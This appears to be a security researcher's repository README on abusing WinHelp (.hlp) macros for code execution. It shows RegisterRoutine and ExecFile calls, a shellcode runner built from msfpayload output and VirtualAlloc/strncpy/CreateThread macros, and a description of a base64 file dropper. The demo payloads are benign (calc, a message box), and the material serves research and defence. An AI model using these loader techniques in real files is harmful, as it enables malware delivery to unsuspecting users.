help-hack
==========
Although deprecated since Windows Vista, macros from WinHelp files are still being (*widely?)* abused by malware writers. The possibility of **embedding code** is an interesting and not very well known *feature* of WinHelp files.

This repository contains sample projects to show different ways to execute custom code, dump files and work around many limitations related to the macros. Detailed description of the techniques in the referenced post and resources.

Hello World !
-------------

To execute a system library function, first register it in the .hpj project:

    [CONFIG]
    RegisterRoutine("User32.dll", "MessageBox", "iSSi")

Then call it either from the supporting .rtf file as below, or from the hpj file directly:

    Say {\uldb  Hello!}{\v !MessageBox(0, "Hello world!", "Important", 0)} \par

![enter image description here](http://cyberinc.co.uk/wp-content/uploads/2014/10/hello.png)

 

Launch Applications
-------------------

The simplest way to launch an external application is to use the **ExecFile** macro:

    ExecFile("calc.exe", "", SW_SHOW, "")               ; Alias: EF
![enter image description here](http://cyberinc.co.uk/wp-content/uploads/2014/10/calc.png)


Execute Shellcode
-----------------

The classic way is to allocate virtual memory for the shellcode (**VirtualAlloc**) and create a new thread which will start executing code from that memory address (**CreateThread**). We have two options here: either we use NULL and let VirtualAlloc chose a place to allocate our memory, or we can specify an address ourselves. Both ways work fine.

To avoid parsing problems and compiler errors, use an alphanumerically encoded shellcode:

    $ msfpayload windows/exec CMD=calc.exe R | msfencode -e x86/alpha_mixed -t raw[*] x86/alpha_mixed succeeded with size 462 (iteration=1)
    
    VYIIIIIIIIIICC...s0AA

Use a hard-coded address for the shellcode buffer:

    VirtualAlloc(0x0DC20000, 0x1000, 0x3000, 0x40);
    strncpy(0x0DC20000,VYIIIIIIIIIICCAA", 462);
    CreateThread(0, 0, 0x0DC20000, 0, 0, 0)

Address can also be chosen at runtime. To do this, we’ll use a feature of WinHelp macros that allows the result of one function to be used as an input parameter for another function:

    CreateThread(0, 0, strncpy(VirtualAlloc(0, 0x1000, 0x3000, 0x40), "YIIII...AA", 462), 0, 0, 0)

File Dropper
------------

This projects decodes a base64 encoded executable, dumps the data to a file on disk and starts its execution.


Custom Libraries
----------------

In the same way we’ve registered functions from Windows system libraries we can register and call functions from any custom library. 
This project registers and calls the SayHello function from the custom my.dll library:

    RegisterRoutine("My.dll", "SayHello", "U")
    
    SayHello()

My.Dll file contains the source code for the library and compilation instructions.

Links
-----
[Code execution from HLP files](http://cyberinc.co.uk/code-execution-from-hlp-files-2/)

[WinHelp virus programmers reference](http://vxheaven.org/29a/29a-4/29a-4.222)

[Icefog APT](http://kasperskycontenthub.com/wp-content/uploads/sites/43/vlpdfs/icefog.pdf)
